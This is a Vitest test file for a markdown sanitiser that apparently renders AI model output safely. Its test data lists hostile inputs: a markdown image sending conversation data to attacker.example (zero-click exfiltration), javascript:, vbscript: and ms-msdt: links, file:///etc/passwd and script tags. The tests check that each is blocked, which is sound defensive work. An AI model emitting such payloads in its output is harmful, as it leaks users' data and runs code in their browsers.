import { describe, it, expect } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { isAllowedImageSource, isSafeLinkTarget } from '../markdownSafety';
import { SafeMarkdown } from '../../components/daily/SafeMarkdown';

const ORIGIN = 'https://daily.example.com';

describe('isAllowedImageSource', () => {
  it.each([
    ['data:image/png;base64,AAAA'],
    ['blob:https://daily.example.com/123'],
    ['/assets/logo.png'],
    ['logo.svg'],
    ['https://daily.example.com/x.png'],
  ])('allows %s', (src) => {
    expect(isAllowedImageSource(src, ORIGIN)).toBe(true);
  });

  it.each([
    ['https://attacker.example/?q=secret'],
    ['//attacker.example/x.png'],
    ['http://daily.example.com/x.png'],
    ['data:text/html;base64,PHNjcmlwdD4='],
    [''],
    [undefined],
  ])('blocks %s', (src) => {
    expect(isAllowedImageSource(src, ORIGIN)).toBe(false);
  });
});

describe('isSafeLinkTarget', () => {
  it.each([['https://learn.microsoft.com'], ['http://intranet'], ['mailto:a@b.com'], ['/daily']])('allows %s', (href) => {
    expect(isSafeLinkTarget(href, ORIGIN)).toBe(true);
  });

  it.each([['javascript:alert(1)'], ['data:text/html,<b>x</b>'], ['vbscript:x'], ['file:///etc/passwd'], ['ms-msdt:/id'], [undefined]])('blocks %s', (href) => {
    expect(isSafeLinkTarget(href, ORIGIN)).toBe(false);
  });
});

describe('SafeMarkdown', () => {
  const render = (content: string) => renderToStaticMarkup(createElement(SafeMarkdown, { content }));

  it('does not render remote images (zero-click exfiltration)', () => {
    const html = render('![secret](https://attacker.example/?q=conversation)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('[secret]');
  });

  it('renders same-origin images', () => {
    expect(render('![logo](/assets/logo.png)')).toContain('<img');
  });

  it('does not render data: images from model output (stripped by react-markdown url transform)', () => {
    expect(render('![chart](data:image/png;base64,AAAA)')).not.toContain('<img');
  });

  it('opens links in a new tab without opener access', () => {
    const html = render('[docs](https://learn.microsoft.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('does not render javascript: links or raw HTML', () => {
    const html = render('[x](javascript:alert(1)) <script>alert(1)</script>');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('<script');
  });
});
